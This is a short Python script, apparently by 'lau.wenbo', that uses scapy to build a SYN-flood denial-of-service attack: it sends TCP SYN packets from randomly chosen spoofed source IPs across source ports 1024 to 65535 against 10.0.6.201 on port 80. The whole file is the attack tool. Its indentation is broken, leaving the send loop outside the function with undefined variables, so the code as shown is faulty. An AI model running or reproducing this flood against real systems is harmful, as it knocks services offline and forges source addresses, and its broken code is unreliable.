# coding: utf-8
__author__ = 'lau.wenbo'

import random
import socket
import time
from scapy.all import *

def synFlood(tgt, dPort):
    srcList = ['11.1.1.2', '22.1.1.102', '33.1.1.2', '125.130.5.199']

for sPort in range(1024, 65535):
    index = random.randrange(4)
    ipLayer = IP(src=srcList[index], dst=tgt)
    tcpLayer = TCP(sport=sPort, dport=dPort, flags='S')
    packet = ipLayer / tcpLayer
    send(packet)


dPort = 80
synFlood("10.0.6.201", dPort)